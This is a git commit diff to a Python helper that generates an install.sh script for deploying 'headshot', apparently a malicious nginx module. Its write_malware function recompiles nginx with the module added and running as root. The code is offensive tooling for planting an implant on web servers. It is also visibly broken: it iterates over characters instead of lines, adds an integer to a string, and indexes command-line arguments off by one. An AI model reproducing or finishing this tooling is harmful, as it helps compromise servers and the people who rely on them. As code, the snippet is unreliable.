dbd0e69ac8654028b794493e161e55e260b753c4
P0nt14c <jason.howe223@gmail.com>
2020-12-16 15:52:16 -0500

    implemented the helper program to write the install.sh script

--- helper.py
+++ helper.py
@@ -1,6 +1,6 @@
 # This file will write the install.sh file to make the deployment of headshot easier. 
 # Simply supply the following argument: version number of nginx, pick from the following package mangers: "yum", "apt", or "package", and the name of the install file you want to create
-# written by Jason Howe
+# written by Jason Howe/P0nt14c
 
 import subprocess
 import sys
@@ -44,7 +44,27 @@ def write_wget(vnum):
 
 
 def write_malware():
-    pass
+    output = subprocess.check_output("/usr/sbin/nginx -V")
+    output = str(output, sys.getdefaultencoding())
+    lines = 0
+    opt_count = 0
+    options = []
+    result = "# add our module as a dependency \n./configure --add-module=../ --user=root "
+    for line in output:
+        # this is the line that has the args we need
+        if lines == 3:
+            options = line.split()
+            # get rid of the "configure arguments:" thing 
+            for element in options:
+                if opt_count >= 2:
+                    # dynamic configs will break headshot, so we exluced them
+                    if "dynamic" not in element:
+                        result += opt_count
+                        result += " "
+        
+        lines = lines + 1
+    result += "\n"
+    return result
     # call nginx -V 
     # save the output 
     # split the output, remove all the bad parts, concat the good parts after that 
@@ -60,19 +80,81 @@ def write_compilation_cleanup(vnum):
     return comp
 
 
+def verify_ver(version):
+    # add our module as a dependency
+    a = version.split(".")
+    if len(a) != 3:
+        return False
+    for x in a:
+        if not x.isdigit():
+            return False
+    return True
+
+
+def verify_packman(package):
+    accepatble = ["yum", "apt", "package"]
+    if package not in accepatble:
+        return False
+    return True
+
 # the main function
-def main():
+def test():
     prep = write_prep()
     print(prep)
     dependencies = write_dependencies("yum")
     print(dependencies)
     wget = write_wget("1.1.1")
     print(wget)
+    malware = write_malware()
+    print(malware)
     comp = write_compilation_cleanup("1.1.1")
     print(comp)
 
 
+def main(version, packmang, file):
+    prep = write_prep()
+    dependencies = write_dependencies(packmang)
+    wget = write_wget(version)
+    malware = write_malware()
+    comp = write_compilation_cleanup(version)
+    
+    try: 
+        file = open(file, "w")
+    except FileNotFoundError:
+        print("File not Found")
+        return False
+
+    file.write(prep)
+    file.write(dependencies)
+    file.write(wget)
+    file.write(malware)
+    file.write(comp)
+    file.close()
+    return True
+
 
 # parse system args, error hanlde, then call main 
 if __name__ == "__main__":
-    main()
+    arg_len = len(sys.argv)
+    file = "install.sh"
+    if arg_len == 2:
+        if sys.argv[2] == "test":
+            print("Beginning Test: \n")
+            test()
+    if arg_len >= 3:
+        if verify_ver(sys.argv[2]):
+            if verify_packman(sys.argv[3]):
+                if arg_len == 4:
+                    file = sys.argv[4]
+                if main(sys.argv[2], sys.argv[3], file):
+                    print("Program completed. Check %s for your script", file)
+                else:
+                    print("Program failed. Please fix errors and try again")
+            else: 
+                print("Not an acceptable package manager. Please try again")
+        else:
+            print("Not a properly formatted version number")
+    else:
+        print("Not an accepatable number of arguments.")
+        print("Usage: python3 helper.py test OR python3 helper.py <x.y.z> <packagemanager> <OPT:filename>")
+    
